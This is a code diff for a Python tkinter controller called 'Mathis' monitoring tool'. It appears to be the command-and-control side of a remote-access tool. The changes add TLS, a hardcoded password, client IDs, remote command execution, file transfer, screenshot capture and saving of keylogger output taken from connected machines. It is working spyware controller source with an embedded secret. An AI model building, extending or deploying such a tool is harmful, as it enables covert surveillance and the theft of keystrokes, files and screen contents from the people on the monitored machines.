@@ -4,19 +4,26 @@ import threading
 import time
 import pickle
 import os
+import mss.tools
+import ssl
 
 class App():
-    def __init__(self):
+    def __init__(self, port, max_clients, timeout):
         self.root = tk.Tk()
         self.root.title("Mathis' monitoring tool")
-        self.root.geometry("400x300")
+        self.root.geometry("1600x900")
 
+        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        self.context.load_cert_chain(certfile="ressources/ssl/cert.pem", keyfile="ressources/ssl/key.pem")
+
+        self.password = "Id6-DIjjf032_ddo"
         self.port = 5203
         self.max_clients = 10
-        self.timeout = 10
-        self.selected_client = ""
+        self.timeout = 2
+        self.selected_client = ["", ""]
         self.socket = None
         self.client = None
+        self.id = ""
         self.client_addr = ()
     
         self.menu_bar = tk.Menu(self.root)
@@ -24,7 +31,7 @@ class App():
         self.filemenu = tk.Menu(self.menu_bar, tearoff=0)
         self.filemenu.add_command(label="New Connection", command=self.conn_manager)
         self.filemenu.add_separator()
-        self.filemenu.add_command(label="Close")
+        self.filemenu.add_command(label="Close Connection", command=self.close_conn)
         self.menu_bar.add_cascade(label="Connection", menu=self.filemenu)
 
         self.keyloggermenu = tk.Menu(self.menu_bar, tearoff=0)
@@ -37,7 +44,7 @@ class App():
         self.menu_bar.add_cascade(label="Keylogger", menu=self.keyloggermenu)
 
         self.terminalmenu = tk.Menu(self.menu_bar, tearoff=0)
-        self.terminalmenu.add_command(label="New Terminal")
+        self.terminalmenu.add_command(label="Clear Terminal", command=self.clear_terminal)
         self.menu_bar.add_cascade(label="Terminal", menu=self.terminalmenu)
 
         self.logsmenu = tk.Menu(self.menu_bar, tearoff=0)
@@ -51,12 +58,19 @@ class App():
 
     def run(self):
         self.root.mainloop()
+        
+    def close_conn(self):
+        try:
+            self.client.close()
+            self.socket.close()
+        except:
+            pass
 
     def conn_manager(self):
         def search():
             conn_manager_ = ConnMaker()
             self.selected_client = conn_manager_.selected_client
-            if self.selected_client != "":
+            if self.selected_client != ["", ""]:
                 self.port = conn_manager_.port
                 self.max_clients = conn_manager_.max_clients.get()
                 self.timeout = conn_manager_.timeout.get()
@@ -71,21 +85,30 @@ class App():
                     while time0 + self.timeout > time.time():
                         try:
                             client, client_addr = self.socket.accept()
-                            data = client.recv(1024).decode()
-                            if client_addr[0] == self.selected_client:
+                            ssock = self.context.wrap_socket(client, server_side=True)
+                            data = ssock.recv(1024).decode()
+                            if client_addr[0] == self.selected_client[0]:
                                 print("client selected")
-                                client.sendall(b"SELECTED")
-                                self.client = client
-                                self.client_addr = client_addr
+                                ssock.send(b"SELECTED")
+                                time.sleep(0.05)
+                                password = ssock.recv(1024).decode()
+                                id_ = ssock.recv(1024).decode()
+                                if self.password == password and id_ == self.selected_client[1]:
+                                    ssock.send(b"GRANTED")
+                                    self.id = id_
+                                    self.client = ssock
+                                    self.client_addr = client_addr
                                 return True
                             else:
-                                client.sendall(b"PINGED")
-                                client.close()
+                                ssock.sendall(b"PINGED")
+                                ssock.close()
                             time.sleep(0.1)
                         except Exception as e:
                             print(1, e)
         threading.Thread(target=search, daemon=True).start()
-                
+        
+    def clear_terminal(self):
+        pass
                 
 class CMD():
     def __init__(self, root):
@@ -93,9 +116,13 @@ class CMD():
         self.text = tk.Text(root, height=70, width=240, bg="white", fg="black", insertbackground='black')
         self.text.pack()
         
+        self.prevent_exit = False
+        
         self.text.bind("<BackSpace>", self.prevent_backspace)
         self.text.bind("<Return>", self.handle_enter)
         self.text.bind("<Left>", self.on_left_arrow)
+        self.text.bind("<Up>", self.on_up_arrow)
+        self.text.bind("<Down>", self.on_down_arrow)
         self.text.bind("<Delete>", self.on_delete)
         
         self.prompt()
@@ -107,7 +134,7 @@ class CMD():
         self.text.mark_set("insert", tk.END)
 
     def prevent_backspace(self, event):
-        if self.text.index(tk.INSERT).split(".")[1] <= '2':
+        if int(self.text.index(tk.INSERT).split(".")[1]) <= 2:
             return "break"
         return None
 
@@ -123,6 +150,11 @@ class CMD():
         if cursor_col <= 2:
             return "break"
         return None
+    
+    def on_down_arrow(self, event):
+        return "break"
+    def on_up_arrow(self, event):
+        return "break"
 
     def handle_enter(self, event):
         line = self.text.get("insert linestart", "insert lineend").strip()
@@ -137,6 +169,16 @@ class CMD():
         self.root.after(600, self.blink_cursor)
 
     def execute_command(self, command):
+        self.prevent_exit = True
+        if not os.path.exists("ressources/received_files/"):
+            os.makedirs("ressources/received_files/")
+        if not os.path.exists("ressources/send_files/"):
+            os.makedirs("ressources/send_files/")
+        if not os.path.exists("ressources/received_screenshots/"):
+            os.makedirs("ressources/received_screenshots/")
+        if not os.path.exists("ressources/keylogger/"):
+            os.makedirs("ressources/keylogger/")
+        
         if app.client == None:
             self.text.insert(tk.END, "\nno client ...")
         else:
@@ -148,8 +190,6 @@ class CMD():
                 data = pickle.dumps(command)
                 if command.startswith("sendfile"):
                     try:
-                        if not os.path.exists("ressources/send_files/"):
-                            os.makedirs("ressources/send_files/")
                         path = command.split(" ")[1]
                         if "ressources/send_files/" not in path:
                             path = f"ressources/send_files/{path}"
@@ -164,21 +204,32 @@ class CMD():
                 header, data = comm(app.client, f"COMMAND:{len(data)}:NONE", data)
                 header = header.split(":")
                 
+                if command == "keylogger save":
+                    with open(f"ressources/keylogger/{time.time()}.txt", "w") as f:
+                        f.write(str(data))
+                
                 if header[0] == "TEXT":
                     self.text.insert(tk.END, "\n" + header[2])
                     self.text.insert(tk.END, "\n" + str(data))
                 elif header[0] == "FILE":
                     self.text.insert(tk.END, "\nGET_FILE")
                     self.text.insert(tk.END, "\nDone")
-                    if not os.path.exists("ressources/received_files/"):
-                        os.makedirs("ressources/received_files/")
                     with open(f"ressources/received_files/{header[2]}", "wb") as f:
                         f.write(data)
+                elif header[0] == "MSS_IMG":
+                    self.text.insert(tk.END, "\n" + header[2])
+                    self.text.insert(tk.END, "\nDone")
+                    name = f"ressources/received_screenshots/{time.time()}.png"
+                    mss.tools.to_png(data.rgb, data.size, output=name)
+                    
                 else:
                     print("mismatched type")
                     
                 if header[2] == "CLOSE":
                     app.client.close()
+                    app.socket.close()
+
+        self.prevent_exit = False
 
         self.prompt()
         
@@ -187,20 +238,22 @@ class ConnMaker():
     def __init__(self):
         self.root = tk.Tk()
         self.root.title("Connection Manager")
+        self.root.geometry("300x300")
         self.running = True
 
-        self.max_clients = tk.IntVar(self.root, 10)
+        self.max_clients = tk.IntVar(self.root, app.max_clients)
         self.port = app.port
         self.clients = []
-        self.timeout = tk.IntVar(self.root, 2)
-        self.selected_client = ""
+        self.ids = []
+        self.timeout = tk.IntVar(self.root, app.timeout)
+        self.selected_client = ["", ""]
 
         tk.Label(self.root, text="Max Clients : ").pack()
         tk.Entry(self.root, textvariable=self.max_clients).pack()
         tk.Label(self.root, text="Timeout : ").pack()
         tk.Entry(self.root, textvariable=self.timeout).pack()
-        tk.Button(self.root, text="Update Search", command=self.update_search).pack()
-        self.conn_list = tk.Listbox(self.root)
+        tk.Button(self.root, text="Start Search", command=self.update_search).pack()
+        self.conn_list = tk.Listbox(self.root, width=50)
         self.conn_list.pack()
         tk.Button(self.root, text="Submit Connection", command=self.submit_client).pack()
 
@@ -210,7 +263,7 @@ class ConnMaker():
         try:
             selections = self.conn_list.curselection()
             if len(selections) == 1:
-                self.selected_client = self.conn_list.get(selections[0])
+                self.selected_client = [self.conn_list.get(selections[0]), self.ids[selections[0]]]
                 self.root.destroy()
                 print("selected : ", self.selected_client)
             else:
@@ -227,24 +280,28 @@ class ConnMaker():
             local_socket.settimeout(1.0)
 
             time0 = time.time()
+            self.conn_list.delete(0, tk.END)
             self.clients = []
+            self.ids = []
             timeout = self.timeout.get()
             while time0 + timeout > time.time():
                 try:
                     client, client_addr = local_socket.accept()
-                    data = client.recv(1024).decode()
+                    ssock = app.context.wrap_socket(client, server_side=True)
+                    data = ssock.recv(1024).decode()
                     time.sleep(0.1)
-                    client.sendall(b"PINGED")
+                    ssock.sendall(b"PINGED")
                     if (client_addr[0] not in self.clients) and data == "IDLE":
                         self.clients.append(client_addr[0])
+                        self.ids.append(ssock.recv(1024).decode())
                     time.sleep(0.1)
-                    client.close()
+                    ssock.close()
                 except Exception as e:
                     print(3, e)
                     
             try:
                 for i, j in enumerate(self.clients):
-                    self.conn_list.insert(i, j)
+                    self.conn_list.insert(i, f"ip address : {j}        id : {self.ids[i]}")
             except:
                 return False
             return True
@@ -257,10 +314,10 @@ def comm(client, header, data):
         client.send(header.encode())
         client.sendall(data)
         
-        header = client.recv(1024).decode()
+        header = client.recv(4096).decode()
         bytes_data = b""
         while len(bytes_data) < int(header.split(":")[1]):
-            packet = client.recv(4096)
+            packet = client.recv(65536)
             if not packet:
                 break
             bytes_data += packet
@@ -272,7 +329,10 @@ def comm(client, header, data):
         return "ERROR:ERROR:ERROR", f"error while receiving data: {e}"
     
 
-
 if __name__ == "__main__":
-    app = App()
+    app = App(5203, 10, 2) #port(must be same as client), max client the server can handle, timeout in seconds
     app.run()
+    try:
+        app.socket.close()
+    except:
+        pass
